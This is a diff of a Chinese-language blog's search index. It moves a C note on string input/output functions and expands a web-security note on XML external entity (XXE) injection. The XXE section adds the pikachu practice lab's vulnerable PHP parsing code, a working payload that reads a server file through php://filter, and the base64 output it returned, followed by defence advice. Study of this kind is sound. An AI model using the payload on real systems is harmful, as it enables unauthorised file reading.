@@ -1255,6 +1255,73 @@ m <span class="token operator">=</span> CRT<span class="token punctuation">(</sp
       </tags>
   </entry>
   <entry>
+    <title>C字符串输入输出</title>
+    <url>/2020/11/16/c-zi-fu-chuan-shu-ru-shu-chu/</url>
+    <content><![CDATA[<p><strong>如果想把一个字符串读入程序，首先必须预留储存该字符串的空间，然后用输入函数获取该字符串。</strong></p>
+<span id="more"></span>
+<h1 id="gets-函数和puts-函数"><a href="#gets-函数和puts-函数" class="headerlink" title="gets()函数和puts()函数"></a>gets()函数和puts()函数</h1><p>gets()函数读取整行输入，直至遇到换行符，然后丢弃换行符，存储其余字符，并在这些字符末尾添加一个空字符，使其成为一个C字符串。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">gets</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>puts()函数显示字符串，并在末尾添加换行符，成功返回非负值，失败返回EOF。puts(words)相当于printf(“%s\n”,words)</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+  <span class="token keyword">int</span> <span class="token function">puts</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="fgets-函数和fputs-函数"><a href="#fgets-函数和fputs-函数" class="headerlink" title="fgets()函数和fputs()函数"></a>fgets()函数和fputs()函数</h1><p>该函数专门用于处理文件输入。</p>
+<p>fgets()函数的第2个参数指明了读入字符的最大数量。如果该参数是n，那么fgets()读入n-1个字符，或者遇到第一个换行符为止。如果fgets()函数读到一个换行符，会把换行符存储在字符串中（和gets()区别）。</p>
+<p>fgets()函数的第3个参数指明要读入的文件。如果是从键盘输入，将stdin（标准输入）作为参数。</p>
+<p>fgets()函数返回指向char的指针。如果正常读入，返回的地址和传入的第1个参数相同。如果读入异常，返回空指针（C语言中用宏NULL来表示）</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">fgets</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>fputs()函数，它不会在末尾添加换行符。如果是从屏幕输入，将stdout（标准输出）作为参数。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+  <span class="token keyword">int</span> <span class="token function">fputs</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="gets-s-函数"><a href="#gets-s-函数" class="headerlink" title="gets_s()函数"></a>gets_s()函数</h1><p>gets_s()只从标准输入中读取数据，所以不需要第三个参数。并且gets_s()读到换行符会丢弃它而不是存储它。</p>
+<p>如果gets_s()读到最大字符数都没有读到换行符，会执行以下几步。首先把目标数组中的首字符设置为空字符，读取并丢弃随后的输入直至读到换行符或者文件结尾，然后返回空指针。接着，调用依赖实现的“处理函数”，可能会中止或退出程序。</p>
+<p>以上的特性说明，只要输入行未超过最大字符数，gets_s()和gets()几乎一模一样，完全可以替换！</p>
+<h1 id="scanf-函数和printf-函数"><a href="#scanf-函数和printf-函数" class="headerlink" title="scanf()函数和printf()函数"></a>scanf()函数和printf()函数</h1><p>scanf()有两种方法确定输入结束：%5s，读取5个字符或者读到第一个空白停止。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>输入语句</th>
+<th>原输入序列</th>
+<th>name中的内容</th>
+<th>剩余输入序列</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>scanf(“%s”,name);</td>
+<td>Fleebert▢Hup</td>
+<td>Fleebert</td>
+<td>▢Hup</td>
+</tr>
+<tr>
+<td>scanf(“%5s”,name);</td>
+<td>Fleebert▢Hup</td>
+<td>Fleeb</td>
+<td>bert▢Hup</td>
+</tr>
+<tr>
+<td>scanf(“%5s”,name);</td>
+<td>Ann▢Ular</td>
+<td>Ann</td>
+<td>▢Ular</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>注：▢表示空格</p>
+<p>printf()函数主要是使用其格式化功能。</p>
+<h1 id="自定义输入输出函数"><a href="#自定义输入输出函数" class="headerlink" title="自定义输入输出函数"></a>自定义输入输出函数</h1><p>不一定非要使用C库中的标准函数，如果无法使用这些函数或不想使用它们，完全可以在getchar()和putchar()的基础上自定义所需的函数。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C格式化修饰符</title>
     <url>/2020/11/12/c-ge-shi-hua-xiu-shi-fu/</url>
     <content><![CDATA[<p>printf()与scanf()函数格式化修饰</p>
@@ -1523,73 +1590,6 @@ m <span class="token operator">=</span> CRT<span class="token punctuation">(</sp
 </tbody>
 </table>
 </div>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C字符串输入输出</title>
-    <url>/2020/11/16/c-zi-fu-chuan-shu-ru-shu-chu/</url>
-    <content><![CDATA[<p><strong>如果想把一个字符串读入程序，首先必须预留储存该字符串的空间，然后用输入函数获取该字符串。</strong></p>
-<span id="more"></span>
-<h1 id="gets-函数和puts-函数"><a href="#gets-函数和puts-函数" class="headerlink" title="gets()函数和puts()函数"></a>gets()函数和puts()函数</h1><p>gets()函数读取整行输入，直至遇到换行符，然后丢弃换行符，存储其余字符，并在这些字符末尾添加一个空字符，使其成为一个C字符串。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">gets</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>puts()函数显示字符串，并在末尾添加换行符，成功返回非负值，失败返回EOF。puts(words)相当于printf(“%s\n”,words)</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-  <span class="token keyword">int</span> <span class="token function">puts</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h1 id="fgets-函数和fputs-函数"><a href="#fgets-函数和fputs-函数" class="headerlink" title="fgets()函数和fputs()函数"></a>fgets()函数和fputs()函数</h1><p>该函数专门用于处理文件输入。</p>
-<p>fgets()函数的第2个参数指明了读入字符的最大数量。如果该参数是n，那么fgets()读入n-1个字符，或者遇到第一个换行符为止。如果fgets()函数读到一个换行符，会把换行符存储在字符串中（和gets()区别）。</p>
-<p>fgets()函数的第3个参数指明要读入的文件。如果是从键盘输入，将stdin（标准输入）作为参数。</p>
-<p>fgets()函数返回指向char的指针。如果正常读入，返回的地址和传入的第1个参数相同。如果读入异常，返回空指针（C语言中用宏NULL来表示）</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">fgets</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>fputs()函数，它不会在末尾添加换行符。如果是从屏幕输入，将stdout（标准输出）作为参数。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-  <span class="token keyword">int</span> <span class="token function">fputs</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h1 id="gets-s-函数"><a href="#gets-s-函数" class="headerlink" title="gets_s()函数"></a>gets_s()函数</h1><p>gets_s()只从标准输入中读取数据，所以不需要第三个参数。并且gets_s()读到换行符会丢弃它而不是存储它。</p>
-<p>如果gets_s()读到最大字符数都没有读到换行符，会执行以下几步。首先把目标数组中的首字符设置为空字符，读取并丢弃随后的输入直至读到换行符或者文件结尾，然后返回空指针。接着，调用依赖实现的“处理函数”，可能会中止或退出程序。</p>
-<p>以上的特性说明，只要输入行未超过最大字符数，gets_s()和gets()几乎一模一样，完全可以替换！</p>
-<h1 id="scanf-函数和printf-函数"><a href="#scanf-函数和printf-函数" class="headerlink" title="scanf()函数和printf()函数"></a>scanf()函数和printf()函数</h1><p>scanf()有两种方法确定输入结束：%5s，读取5个字符或者读到第一个空白停止。</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>输入语句</th>
-<th>原输入序列</th>
-<th>name中的内容</th>
-<th>剩余输入序列</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>scanf(“%s”,name);</td>
-<td>Fleebert▢Hup</td>
-<td>Fleebert</td>
-<td>▢Hup</td>
-</tr>
-<tr>
-<td>scanf(“%5s”,name);</td>
-<td>Fleebert▢Hup</td>
-<td>Fleeb</td>
-<td>bert▢Hup</td>
-</tr>
-<tr>
-<td>scanf(“%5s”,name);</td>
-<td>Ann▢Ular</td>
-<td>Ann</td>
-<td>▢Ular</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>注：▢表示空格</p>
-<p>printf()函数主要是使用其格式化功能。</p>
-<h1 id="自定义输入输出函数"><a href="#自定义输入输出函数" class="headerlink" title="自定义输入输出函数"></a>自定义输入输出函数</h1><p>不一定非要使用C库中的标准函数，如果无法使用这些函数或不想使用它们，完全可以在getchar()和putchar()的基础上自定义所需的函数。</p>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -5008,7 +5008,26 @@ allow_url_include &#x3D; On（是否允许include&#x2F;require远程文件）<sp
 <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>XXE漏洞全称 XML External Entity Injection ，即XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p>
 <p><strong>漏洞利用</strong></p>
 <p>靶场：pikachu xxe</p>
-<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxe.php&quot;&gt;]&gt;&lt;x&gt;&amp;file;&lt;&#x2F;x&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>相关源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+<span class="token comment">//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+    <span class="token variable">$xml</span> <span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token comment">//    $xml = $test;</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'SimpleXMLElement'</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>payload：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxe.php&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;file;&lt;&#x2F;x&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>output:</p>
 <pre class="line-numbers language-none"><code class="language-none">PD9waHAKLyoqCiAqIENyZWF0ZWQgYnkgcnVubmVyLmhhbgogKiBUaGVyZSBpcyBub3RoaW5nIG5ldyB1bmRlciB0aGUgc3VuCiAqLwoKCiRTRUxGX1BBR0UgPSBzdWJzdHIoJF9TRVJWRVJbJ1BIUF9TRUxGJ10sc3RycnBvcygkX1NFUlZFUlsnUEhQX1NFTEYnXSwnLycpKzEpOwoKaWYgKCRTRUxGX1BBR0UgPSAieHhlLnBocCIpewogICAgJEFDVElWRSA9IGFycmF5KCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCdhY3RpdmUgb3BlbicsJ2FjdGl2ZScsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycpOwp9CgokUElLQV9ST09UX0RJUiA9ICAiLi4vLi4vIjsKaW5jbHVkZV9vbmNlICRQSUtBX1JPT1RfRElSLidoZWFkZXIucGhwJzsKCgo&#x2F;PgoKCgo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiPgogICAgPGRpdiBjbGFzcz0ibWFpbi1jb250ZW50LWlubmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJicmVhZGNydW1icyBhY2Utc2F2ZS1zdGF0ZSIgaWQ9ImJyZWFkY3J1bWJzIj4KICAgICAgICAgICAgPHVsIGNsYXNzPSJicmVhZGNydW1iIj4KICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iYWNlLWljb24gZmEgZmEtaG9tZSBob21lLWljb24iPjwvaT4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJ4ZWUucGhwIj48L2E+CiAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPuamgui&#x2F;sDwvbGk+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250ZW50Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InZ1bCBpbmZvIj4KICAgICAgICAgICAgICAgIFhYRSAtInhtbCBleHRlcm5hbCBlbnRpdHkgaW5qZWN0aW9uIjxicj4KICAgICAgICAgICAgICAgIOaXoiJ4bWzlpJbpg6jlrp7kvZPms6jlhaXmvI&#x2F;mtJ4i44CCPGJyPgogICAgICAgICAgICAgICAg5qaC5ous5LiA5LiL5bCx5pivIuaUu+WHu+iAhemAmui&#x2F;h+WQkeacjeWKoeWZqOazqOWFpeaMh+WumueahHhtbOWunuS9k+WGheWuuSzku47ogIzorqnmnI3liqHlmajmjInnhafmjIflrprnmoTphY3nva7ov5vooYzmiafooYws5a+86Ie06Zeu6aKYIjxicj4KICAgICAgICAgICAgICAgIOS5n+WwseaYr+ivtOacjeWKoeerr+aOpeaUtuWSjOino+aekOS6huadpeiHqueUqOaIt+err+eahHhtbOaVsOaNrizogIzlj4jmsqHmnInlgZrkuKXmoLznmoTlronlhajmjqfliLYs5LuO6ICM5a+86Ie0eG1s5aSW6YOo5a6e5L2T5rOo5YWl44CCPGJyPgogICAgICAgICAgICAgICAgPGJyPgogICAgICAgICAgICAgICAg5YW35L2T55qE5YWz5LqOeG1s5a6e5L2T55qE5LuL57uNLOe9kee7nOS4iuacieW+iOWkmizoh6rlt7HliqjmiYvlhYjmn6XkuIDkuIvjgIIKICAgICAgICAgICAgICAgIDxicj4KICAgICAgICAgICAgICAgIOeOsOWcqOW+iOWkmuivreiogOmHjOmdouWvueW6lOeahOino+aekHhtbOeahOWHveaVsOm7mOiupOaYr+emgeatouino+aekOWklumDqOWunuS9k+WGheWuueeahCzku47ogIzkuZ&#x2F;lsLHnm7TmjqXpgb&#x2F;lhY3kuobov5nkuKrmvI&#x2F;mtJ7jgII8YnI+CiAgICAgICAgICAgICAgICDku6VQSFDkuLrkvoss5ZyoUEhQ6YeM6Z2i6Kej5p6QeG1s55So55qE5pivbGlieG1sLOWFtuWcqOKJpTIuOS4w55qE54mI5pys5LitLOm7mOiupOaYr+emgeatouino+aekHhtbOWklumDqOWunuS9k+WGheWuueeahOOAgjxicj4KICAgICAgICAgICAgICAgIDxicj4KICAgICAgICAgICAgICAgIOacrOeroOaPkOS+m+eahOahiOS+i+S4rSzkuLrkuobmqKHmi5&#x2F;mvI&#x2F;mtJ4s6YCa6L+H5omL5Yqo5oyH5a6aTElCWE1MX05PRU5U6YCJ6aG55byA5ZCv5LqGeG1s5aSW6YOo5a6e5L2T6Kej5p6Q44CCCgoKICAgICAgICAgICAgPC9kaXY+CgogICAgICAgIDwvZGl2PjwhLS0gLy5wYWdlLWNvbnRlbnQgLS0+CiAgICA8L2Rpdj4KPC9kaXY+PCEtLSAvLm1haW4tY29udGVudCAtLT4KCgoKPD9waHAKaW5jbHVkZV9vbmNlICRQSUtBX1JPT1RfRElSIC4gJ2Zvb3Rlci5waHAnOwoKPz4K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><p>1.使用开发语言提供的禁用外部实体的方法</p>
